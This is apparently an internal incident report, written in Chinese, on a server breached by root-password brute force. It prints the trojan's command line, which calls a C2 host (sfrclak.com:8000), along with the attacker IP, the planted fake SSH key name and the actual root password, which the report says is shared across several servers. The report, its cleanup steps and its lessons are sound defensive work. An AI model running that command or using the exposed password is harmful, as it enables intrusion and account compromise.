## 1. 🔴 安全事件：服务器被入侵

### 发现

在检查服务器 `china (47.100.20.52)` 时发现异常进程：

```
python3 /tmp/ld.py http://sfrclak.com:8000/6202033
```

这是一个**远控木马（Botnet Client）**，行为：
- 每 60 秒向外部 C2 服务器 `sfrclak.com:8000` 上报系统信息
- 可接收并执行任意脚本
- 可做进程注入

### 入侵路径

通过分析 `/var/log/auth.log` 和 `bash_history` 确认：

| 时间 | 事件 |
|------|------|
| 13:03~13:11 | 攻击者 `1.92.81.151` 暴力破解 root 密码成功 |
| 09:20 | `ld.py` 写入 `/tmp/` |
| 09:50 | `/var/www/ssl/` 证书服务部署 |
| 09:50 | SSL 证书生成 |

**入侵方式**：弱密码暴力破解（密码就是 `Xman200233..`）

**后门**：入侵者在 `/root/.ssh/authorized_keys` 中植入了伪造的 `openclaw-agent` SSH 密钥（注意：这是入侵者伪造的，不是真正的 OpenClaw 密钥）

### 清理措施（china 服务器）

- ✅ Kill `ld.py` 进程
- ✅ 删除 `/tmp/ld.py`
- ✅ 删除伪造的 SSH 密钥
- ✅ 更改 root 密码
- ✅ 封禁攻击者 IP `1.92.81.151`
- ✅ 禁用密码认证（改为仅密钥登录）
- ✅ 重启 SSH 服务

|--------|---------|-------|------|

## 教训

1. **弱密码是根本原因**：root 密码 `Xman200233..` 太简单，被暴力破解
2. **密码认证风险极高**：公网服务器开密码认证 = 迟早被破
3. **多台服务器同密码**：china / us / ali-enos 使用相同密码，一台被破其他也危险
4. **`authorized_keys` 需定期检查**：注意区分 OpenClaw 正常密钥和伪造密钥（入侵者故意用了 `openclaw-agent` 这个名称混淆）
